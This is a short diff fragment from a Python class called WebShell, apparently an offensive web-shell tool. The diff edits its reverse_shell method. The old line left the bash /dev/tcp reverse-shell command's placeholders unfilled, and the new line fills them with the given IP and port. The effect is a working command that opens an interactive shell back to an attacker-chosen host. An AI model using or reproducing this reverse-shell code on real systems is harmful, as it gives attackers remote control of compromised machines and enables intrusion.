@@ -145,4 +145,4 @@ class WebShell():
         pass
 
     def reverse_shell(self, ip, port):
-        return self.auto_exec("bash -c 'sh -i >&/dev/tcp/%s/%s 2>&1 0>&1' && echo 'Success!'")
+        return self.auto_exec("bash -c 'sh -i >&/dev/tcp/%s/%s 0>&1'" % (ip, port))
